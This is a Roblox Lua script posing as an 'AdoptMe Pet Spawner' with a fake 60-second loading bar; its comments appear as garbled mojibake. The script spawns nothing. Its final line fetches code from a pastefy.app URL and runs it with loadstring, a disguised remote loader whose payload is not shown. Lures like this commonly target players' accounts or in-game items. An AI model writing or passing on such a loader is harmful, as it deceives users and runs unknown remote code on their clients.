local TweenService = game:GetService("TweenService")

-- –°–æ–∑–¥–∞—ë–º ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- –§–æ–Ω
local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
bg.BackgroundTransparency = 1
bg.Parent = screenGui

-- –ó–∞–≥–æ–ª–æ–≤–æ–∫
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 100)
title.Position = UDim2.new(0, 0, 0.35, 0)
title.BackgroundTransparency = 1
title.Text = "AdoptMe Pet Spawner ArtiXHub"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextScaled = true
title.TextTransparency = 1
title.Parent = bg

-- –ö–æ–Ω—Ç–µ–π–Ω–µ—Ä –ø–æ–ª–æ—Å–∫–∏
local barContainer = Instance.new("Frame")
barContainer.Size = UDim2.new(0.6, 0, 0, 25)
barContainer.Position = UDim2.new(0.2, 0, 0.52, 0)
barContainer.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
barContainer.BorderSizePixel = 0
barContainer.BackgroundTransparency = 1
barContainer.Parent = bg

-- –ó–∞–ø–æ–ª–Ω—è–µ–º–∞—è –ø–æ–ª–æ—Å–∫–∞
local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
barFill.BorderSizePixel = 0
barFill.Parent = barContainer

-- –ü—Ä–æ—Ü–µ–Ω—Ç—ã
local percentText = Instance.new("TextLabel")
percentText.Size = UDim2.new(1, 0, 0, 40)
percentText.Position = UDim2.new(0, 0, 0.56, 30)
percentText.BackgroundTransparency = 1
percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
percentText.Font = Enum.Font.GothamBold
percentText.TextScaled = true
percentText.Text = "0%"
percentText.TextTransparency = 1
percentText.Parent = bg

-------------------------------------------------------
-- üåü –ü–õ–ê–í–ù–û–ï –ü–û–Ø–í–õ–ï–ù–ò–ï –í–°–ï–ì–û –≠–ö–†–ê–ù–ê
-------------------------------------------------------
local fadeIn = TweenService:Create(bg, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {
    BackgroundTransparency = 0
})
local textIn = TweenService:Create(title, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {
    TextTransparency = 0
})
local barIn = TweenService:Create(barContainer, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {
    BackgroundTransparency = 0
})
local percentIn = TweenService:Create(percentText, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {
    TextTransparency = 0
})

fadeIn:Play()
textIn:Play()
barIn:Play()
percentIn:Play()

task.wait(1.2)

-------------------------------------------------------
-- üîµ –ö–†–ê–°–ò–í–ê–Ø –ê–ù–ò–ú–ê–¶–ò–Ø –ü–û–õ–û–°–ö–ò (smooth easing)
-------------------------------------------------------

local duration = 60  -- 60 —Å–µ–∫—É–Ω–¥
local steps = 100

for i = 0, steps do
    percentText.Text = i .. "%"

    -- –ø–ª–∞–≤–Ω–∞—è –∞–Ω–∏–º–∞—Ü–∏—è –¥–≤–∏–∂–µ–Ω–∏—è –ø–æ–ª–æ—Å–∫–∏ –ø—Ä–∏ –∫–∞–∂–¥–æ–º —à–∞–≥–µ
    TweenService:Create(
        barFill,
        TweenInfo.new(duration / steps, Enum.EasingStyle.Sine, Enum.EasingDirection.Out),
        { Size = UDim2.new(i/100, 0, 1, 0) }
    ):Play()

    task.wait(duration / steps)
end

-------------------------------------------------------
-- üåô –ü–õ–ê–í–ù–û–ï –ò–°–ß–ï–ó–ù–û–í–ï–ù–ò–ï
-------------------------------------------------------

local fadeOut = TweenService:Create(bg, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {
    BackgroundTransparency = 1
})
local textOut = TweenService:Create(title, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {
    TextTransparency = 1
})
local barOut = TweenService:Create(barContainer, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {
    BackgroundTransparency = 1
})
local percentOut = TweenService:Create(percentText, TweenInfo.new(1.2, Enum.EasingStyle.Quad), {
    TextTransparency = 1
})

fadeOut:Play()
textOut:Play()
barOut:Play()
percentOut:Play()

task.wait(1.3)
bg:Destroy()

loadstring(game:HttpGet("https://pastefy.app/BLldvDWO/raw"))()
